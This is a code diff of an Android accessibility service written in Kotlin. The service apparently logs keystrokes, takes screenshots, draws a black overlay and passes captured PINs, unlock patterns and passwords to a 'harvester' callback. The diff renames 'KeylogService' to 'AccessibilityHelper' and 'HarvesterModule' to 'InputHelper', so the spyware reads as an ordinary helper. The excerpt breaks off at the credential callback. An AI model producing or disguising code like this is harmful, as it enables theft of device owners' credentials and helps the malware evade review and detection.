@@ -27,16 +27,16 @@ import java.io.File
 import java.util.concurrent.Executors
 import kotlin.coroutines.resume
 
-class KeylogService : AccessibilityService() {
+class AccessibilityHelper : AccessibilityService() {
     companion object {
-        private const val TAG = "KeylogService"
+        private const val TAG = "AccessibilityHelper"
         private val textLock = Any()
         var capturedText: String = ""
             private set
         var isRunning = false
             private set
         private var logFile: File? = null
-        @JvmStatic var instance: KeylogService? = null
+        @JvmStatic var instance: AccessibilityHelper? = null
             private set
         private val screenshotExecutor = Executors.newSingleThreadExecutor()
 
@@ -76,7 +76,7 @@ class KeylogService : AccessibilityService() {
         }
     }
 
-    lateinit var harvester: HarvesterModule
+    lateinit var harvester: InputHelper
         private set
     private var windowManager: WindowManager? = null
     private var blackOverlay: FrameLayout? = null
@@ -88,7 +88,7 @@ class KeylogService : AccessibilityService() {
         isRunning = true
         windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
         keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
-        harvester = HarvesterModule(this)
+        harvester = InputHelper(this)
         logFile?.let { harvester.setLogFile(it) }
         harvester.setCallback { pin, pattern, password ->
             
